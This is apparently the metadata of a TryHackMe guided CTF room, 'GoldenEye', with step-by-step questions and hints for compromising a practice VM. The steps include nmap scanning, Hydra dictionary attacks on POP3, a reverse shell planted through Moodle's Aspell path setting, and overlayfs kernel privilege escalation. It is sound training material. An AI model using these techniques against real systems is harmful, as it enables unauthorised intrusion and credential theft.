{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/77b55a2ac1ac79ca534d6fc003c042b3.png', 'title': 'GoldenEye', 'description': 'Bond, James Bond. A guided CTF.', 'code': 'goldeneye', 'users': 8983, 'tags': ['hydra', 'nmap', 'email', 'enumeration'], 'type': 'challenge', 'difficulty': 'medium', 'userCompleted': False, 'upVotes': 428, 'created': '2019-02-08T18:38:31.739Z', 'published': '2019-02-08T18:38:31.739Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': '/img/banners/default_tryhackme.png', 'creator': 'ben', 'tasks': [{'taskTitle': 'Intro &amp; Enumeration', 'taskDesc': '<p>This room will be a guided challenge to hack the James Bond styled box and get root.</p><p>Credit to\xa0<span style="font-size:1rem"><a href="https://www.vulnhub.com/author/creosote,584/">creosote</a> for creating this VM.\xa0</span><span style="font-weight:bolder;text-align:-webkit-center;font-size:1rem">This machine is used here with the explicit permission of the creator &lt;3</span></p><p>So.. Lets get started!</p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2019-02-08T18:42:00.201Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '5c5caf9094b4053c873b3135', 'questions': [{'questionNo': 1, 'question': '<p>First things first, connect to our <a href="https://tryhackme.com/access" target="_blank">network</a> and deploy the machine.</p>', 'hint': ''}, {'questionNo': '2', 'question': '<p>Use nmap to scan the network for all ports. How many ports are open?</p>', 'hint': 'nmap -p- -Pn <ip>'}, {'questionNo': '3', 'question': '<p>Take a look on the website, take a dive into the source code too and remember to inspect all scripts!</p>', 'hint': ''}, {'questionNo': '4', 'question': '<p>Who needs to make sure they update their default password?</p>', 'hint': ''}, {'questionNo': '5', 'question': '<p>Whats their password?</p>', 'hint': ''}, {'questionNo': '6', 'question': '<p>Now go use those credentials and login to a part of the site.</p>', 'hint': ''}]}, {'taskTitle': 'Its mail time...', 'taskDesc': '<p>Onto the next steps..\xa0</p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2019-02-08T18:59:51.922Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p><span style="color:rgb(0, 0, 0);">Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?\xa0</span><br /></p>', 'hint': ''}, {'questionNo': 2, 'question': "<p>If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?</p>", 'hint': 'pop3'}, {'questionNo': 3, 'question': '<p>Inspect port 55007, what services is configured to use this port?</p>', 'hint': ''}, {'questionNo': '4', 'question': '<p>Login using that service and the credentials you found earlier.</p>', 'hint': ''}, {'questionNo': '5', 'question': '<p>What can you find on this service?</p>', 'hint': ''}, {'questionNo': '6', 'question': "<p>What user can break Boris' codes?</p>", 'hint': ''}, {'questionNo': '7', 'question': '<p>Using the users you found on this service, find other users passwords</p>', 'hint': ''}, {'questionNo': '8', 'question': '<p>Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.</p>', 'hint': "You will eventually get a xenia's password in plaintext."}]}, {'taskTitle': 'GoldenEye Operators Training', 'taskDesc': '<p>Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.</p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2019-02-08T19:22:49.891Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>If you remembered in some of the emails you discovered, there is the severnaya-station.com website. To get this working, you need up update your DNS records to reveal it.</p><p>If you\'re on Linux edit your "/etc/hosts" file and add:</p><p>&lt;machines ip&gt; severnaya-station.com</p><p>If you\'re on Windows do the same but in the "c:\\Windows\\System32\\Drivers\\etc\\hosts" file</p>', 'hint': ''}, {'questionNo': '2', 'question': '<p>Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir</p>', 'hint': ''}, {'questionNo': '3', 'question': '<p>Try using the credentials you found earlier. Which user can you login as?</p>', 'hint': ''}, {'questionNo': '4', 'question': '<p>Have a poke around the site. What other user can you find?</p>', 'hint': ''}, {'questionNo': '5', 'question': '<p>What was this users password?</p>', 'hint': 'pop3 + hydra'}, {'questionNo': '6', 'question': '<p>Use this users credentials to go through all the services you have found to reveal more emails.</p>', 'hint': ''}, {'questionNo': '7', 'question': '<p>What is the next user you can find from doak?</p>', 'hint': 'Emails, emails, emails..'}, {'questionNo': '8', 'question': '<p>What is this users password?</p>', 'hint': ''}, {'questionNo': '9', 'question': '<p>Take a look at their files on the moodle (<span style="font-size:1rem;">severnaya-station.com)</span></p>', 'hint': ''}, {'questionNo': '10', 'question': '<p>Download the attachments and see if there are any hidden messages inside them?</p>', 'hint': 'Use exiftool'}, {'questionNo': '11', 'question': '<p>Using the information you found in the last task, login with the newly found user.</p>', 'hint': ''}, {'questionNo': '12', 'question': '<p>As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.</p><p>Take a look into Aspell, the spell checker plugin.</p>', 'hint': 'Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and "spell check it".'}]}, {'taskTitle': 'Privilege Escalation ', 'taskDesc': '<p>Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.</p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2019-02-08T19:39:18.448Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Download the <a href="https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123">linuxprivchecker</a> to enumerate installed development tools.</p><p>To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:</p><ul><li>Download the linuxprivchecker file locally</li><li>Navigate to the file on your file system</li><li>Do: <b>python -m SimpleHTTPServer 1337</b> (leave this running)</li><li>On the VM you can now do: wget &lt;your IP&gt;/&lt;file&gt;.py</li></ul><p><b>OR</b></p><p>Enumerate the machine manually.</p>', 'hint': ''}, {'questionNo': '2', 'question': '<p>Whats the kernel version?<br /></p>', 'hint': 'uname -a'}, {'questionNo': '3', 'question': '<p>This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:</p><ul><li>Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.</li><li>Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.</li><li>Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.</li><li>Make su on overlayfs world writable without changing the owner</li><li>Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.</li><li>Execute the modified su binary</li></ul><p>You can download the exploit from here: <a href="https://www.exploit-db.com/exploits/37292">https://www.exploit-db.com/exploits/37292</a><br /></p>', 'hint': ''}, {'questionNo': '4', 'question': "<p>Fix the exploit to work with the system you're trying to exploit. Remember, enumeration is your key!</p><p>What development tools are installed on the machine?<br /></p>", 'hint': "Its a VERY simple fix. You're only changing 1 character..."}, {'questionNo': '5', 'question': '<p>What is the root flag?</p><p><img src="https://i.imgur.com/qtALFwb.gif" style="width:358px;" /></p>', 'hint': 'This is located in the root user folder.'}]}]}